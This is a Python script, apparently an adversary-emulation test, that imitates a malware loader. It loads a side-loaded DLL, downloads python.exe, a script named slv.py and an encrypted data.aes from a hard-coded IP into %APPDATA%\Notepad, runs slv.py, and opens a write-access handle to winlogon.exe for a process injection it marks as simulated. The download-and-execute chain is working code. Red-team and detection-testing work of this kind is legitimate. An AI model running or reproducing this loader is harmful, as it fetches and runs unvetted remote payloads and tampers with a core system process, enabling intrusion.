import os
import shutil
import ctypes
import subprocess
import urllib.request
import psutil
import time

# === CONFIGURATION ===
NOTEPAD_FOLDER = os.path.join(os.getenv("APPDATA"), "Notepad")
DLL_PATH = os.path.join(os.getcwd(), "python311.dll")  # Must be in same folder
DOWNLOADS = {
    "python.exe": "http://192.168.204.152/python.exe",
    "pycryptodome.txt": "http://192.168.204.152/pycryptodome.txt",
    "slv.py": "http://192.168.204.152/slv.py",
    "data.aes": "http://192.168.204.152/data.aes"
}

# === STEP 1: Simulate DLL sideloading ===
print("[*] Loading DLL...")
try:
    ctypes.CDLL(DLL_PATH)
    print(f"[+] Loaded python311.dll from {DLL_PATH}")
except Exception as e:
    print(f"[!] Failed to load DLL: {e}")

# === STEP 2: Create Notepad folder ===
os.makedirs(NOTEPAD_FOLDER, exist_ok=True)
print(f"[+] Created folder: {NOTEPAD_FOLDER}")

# === STEP 3: Download files into %AppData%\Notepad ===
for filename, url in DOWNLOADS.items():
    dest_path = os.path.join(NOTEPAD_FOLDER, filename)
    try:
        print(f"[*] Downloading {filename}...")
        urllib.request.urlretrieve(url, dest_path)
        print(f"[+] Downloaded to {dest_path}")
    except Exception as e:
        print(f"[!] Failed to download {filename}: {e}")

# === STEP 4: Execute slv.py ===
slv_path = os.path.join(NOTEPAD_FOLDER, "slv.py")
print(f"[*] Executing: {slv_path}")
try:
    subprocess.Popen(["python", slv_path], cwd=NOTEPAD_FOLDER)
    print("[+] slv.py launched")
except Exception as e:
    print(f"[!] Failed to execute slv.py: {e}")

# === STEP 5: Inject into winlogon.exe (simulated) ===
print("[*] Attempting to inject into winlogon.exe...")

# Step 5.1: Find winlogon PID
winlogon_pid = None
for proc in psutil.process_iter(['pid', 'name']):
    if proc.info['name'].lower() == 'winlogon.exe':
        winlogon_pid = proc.info['pid']
        break

if winlogon_pid:
    print(f"[+] Found winlogon.exe PID: {winlogon_pid}")

    # Step 5.2: Simulate injection
    print("[!] Opening process with access mask 0x143A (PROCESS_VM_WRITE, etc)")
    
    try:
        PROCESS_ALL_ACCESS = 0x1F0FFF
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        handle = kernel32.OpenProcess(0x143A, False, winlogon_pid)
        if handle:
            print(f"[+] Opened handle to winlogon.exe: {handle}")

            # WARNING: Real injection would use VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
            # We'll simulate this:
            print("[!] [SIMULATED] Injecting shellcode into winlogon.exe...")

            # Sleep to simulate injection time
            time.sleep(2)

            # Close handle
            kernel32.CloseHandle(handle)
            print("[+] Injection simulation complete.")
        else:
            print(f"[!] Could not open winlogon.exe, access denied.")
    except Exception as e:
        print(f"[!] Injection error: {e}")
else:
    print("[!] winlogon.exe not found!")

print("\n[✅] Setup.py simulation complete.")
